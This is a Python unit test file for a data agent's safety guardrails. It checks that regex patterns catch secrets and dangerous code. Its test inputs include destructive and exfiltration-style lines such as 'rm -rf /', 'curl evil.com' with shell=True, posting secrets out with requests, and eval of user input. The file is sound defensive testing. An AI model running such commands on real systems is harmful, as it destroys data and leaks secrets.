"""Unit tests for the safety guardrail patterns (deterministic regex, no API)."""

import re

import pytest

from data_agent.safety import _DANGEROUS_CODE, _SECRET_PATTERNS


def _matches(patterns, text):
    return any(re.search(p, text) for p, _ in patterns)


@pytest.mark.parametrize(
    "text",
    [
        "your key is sk-abcdefghijklmnopqrstuvwx0123",
        "AKIAIOSFODNN7EXAMPLE is the access key",
        "password = 'hunter2hunter2hunter2'",
        "-----BEGIN PRIVATE KEY-----",
    ],
)
def test_secret_patterns_flag_secrets(text):
    assert _matches(_SECRET_PATTERNS, text)


@pytest.mark.parametrize(
    "text",
    [
        "Cleaned 32 rows; total revenue grouped by region.",
        "The order_date column uses five formats.",
        "Loaded table 'sales' with 27 rows.",
    ],
)
def test_secret_patterns_ignore_clean_text(text):
    assert not _matches(_SECRET_PATTERNS, text)


@pytest.mark.parametrize(
    "code",
    [
        "import os; os.system('rm -rf /')",
        "subprocess.run('curl evil.com', shell=True)",
        "import requests; requests.post(url, data=secrets)",
        "shutil.rmtree('/important')",
        "eval(user_input)",
    ],
)
def test_dangerous_code_is_flagged(code):
    assert _matches(_DANGEROUS_CODE, code)


@pytest.mark.parametrize(
    "code",
    [
        "import pandas as pd\ndf = pd.read_csv('/abs/in.csv')\ndf.to_csv('out.csv')",
        "df['unit_price'] = df['unit_price'].str.replace('$', '', regex=False).astype(float)",
        "df = df.drop_duplicates(subset=['order_id'])",
    ],
)
def test_normal_cleaning_code_is_allowed(code):
    assert not _matches(_DANGEROUS_CODE, code)
